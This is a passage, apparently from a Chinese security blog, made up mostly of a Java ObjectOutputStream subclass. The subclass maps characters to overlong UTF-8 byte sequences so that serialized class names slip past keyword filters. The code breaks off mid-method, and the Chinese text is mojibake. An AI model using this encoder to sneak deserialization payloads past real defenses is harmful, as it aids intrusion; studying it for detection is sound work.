ç®€å•ï¼Œä¿®æ”¹ä¸€ä¸‹å˜æˆè¿™æ ·</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.OutputStream;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UTF8OutputStream</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ObjectOutputStream</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UTF8OutputStream</span><span class="hljs-params">(OutputStream out)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-built_in">super</span>(out);<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">UTF8OutputStream</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, SecurityException &#123;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> HashMap&lt;Character, <span class="hljs-type">int</span>[]&gt; map;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Map&lt;Character,<span class="hljs-type">int</span>[]&gt; bytesMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc0</span>, <span class="hljs-number">0xae</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc0</span>, <span class="hljs-number">0xbb</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc0</span>, <span class="hljs-number">0xa4</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x9b</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x9d</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa1</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa2</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa3</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa4</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa5</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa6</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa7</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa8</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa9</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xaa</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xab</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xac</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xad</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xae</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xaf</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb0</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb1</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb2</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb3</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb4</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb5</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb6</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb7</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb8</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xb9</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xba</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x81</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x82</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x83</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x84</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x85</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x86</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x87</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x88</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x89</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;J&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8a</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8b</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8c</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;M&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8d</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8e</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x8f</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x90</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;Q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x91</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x92</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x93</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x94</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x95</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x96</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x97</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x98</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x99</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;Z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x9a</span>&#125;);<br><br><br>        bytesMap.put(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0xa4</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0xae</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0xbb</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x81</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x82</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x83</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x84</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x85</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x86</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x87</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x88</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x89</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;J&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8a</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8b</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8c</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;M&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8d</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8e</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8f</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x90</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;Q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x91</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x92</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x93</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x94</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x95</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x96</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x97</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x98</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x99</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;Z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x9a</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x9b</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x9d</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa1</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa2</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa3</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa4</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa5</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa6</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa7</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa8</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa9</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xaa</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xab</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xac</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xad</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xae</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xaf</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb0</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb1</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb2</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb3</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb4</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb5</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb6</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb7</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb8</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb9</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xba</span>&#125;);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">charWritTwoBytes</span><span class="hljs-params">(String name)</span>&#123;<br>        <span class="hljs-comment">//å°†nameè¿›è¡Œoverlong Encoding</span><br>        <span class="hljs-type">byte</span>[] bytes=<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[name.length() * <span class="hljs-number">2</span>];<br>        <span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;<br>        StringBuffer str=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; name.length(); i++) 